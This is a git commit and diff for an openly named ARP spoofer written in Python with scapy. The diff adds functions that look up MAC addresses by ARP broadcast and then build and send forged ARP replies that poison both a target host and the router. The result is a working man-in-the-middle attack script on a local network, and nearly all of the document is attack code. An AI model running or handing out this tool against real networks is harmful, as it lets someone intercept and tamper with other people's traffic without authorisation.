93afd2f2ab98f1eda76749f310721c0a445a292a
RockBlet <belyakove31@gmail.com>
2022-12-17 00:58:47 +0300

    update packet create function, add packets send function, add get mac function

--- Moon/arp_spoofer.py
+++ Moon/arp_spoofer.py
@@ -6,21 +6,46 @@ def get_arguments():
 
     parser = optparse.OptionParser()
     parser.add_option("-r", "--route", dest="route_ip", help="router ip address")
-    parser.add_option("-t", "--target_ip)", dest="target_ip", help="target ip address")
-    parser.add_option("-m", "--target_mac", dest="target_mac", help="target mac address")
+    parser.add_option("-t", "--target", dest="target_ip", help="target ip address")
     (options, arguments) = parser.parse_args()
 
     return options
 
 
-def packets_create(options):
+def get_mac(ip):
+    arp_request = scapy.ARP(pdst=ip)
+    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
+    arp_request_broadcast = broadcast/arp_request
 
-    target_ip = options.target_ip
+    answeres_list = scapy.srp(arp_request_broadcast, timeout=2, verbose=False)[0]
+    mac = answeres_list[0][1].hwsrc
+
+    return mac
+
+
+def packets_create(options) -> list:
     route_ip = options.route_ip
-    target_mac = options.target_mac
+    target_ip = options.target_ip
+    route_mac = get_mac(route_ip)
+    target_mac = get_mac(target_ip)
 
     target_packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=route_ip)
+    route_packet = scapy.ARP(op=2, pdst=route_ip, hwdst=route_mac, psrc=target_ip)
+
+    packets_list = [target_packet, route_packet]
+
+    return packets_list
+
+
+def packets_send(packets: list):
+    print("[+] Sending packets")
+    for packet in packets:
+        scapy.send(packet)
+    print(".")
+    print("[+] Packets sent ")
 
 
 if __name__ == "__main__":
-    pass
+    options = get_arguments()
+    packets_list = packets_create(options)
+    packets_send(packets_list)
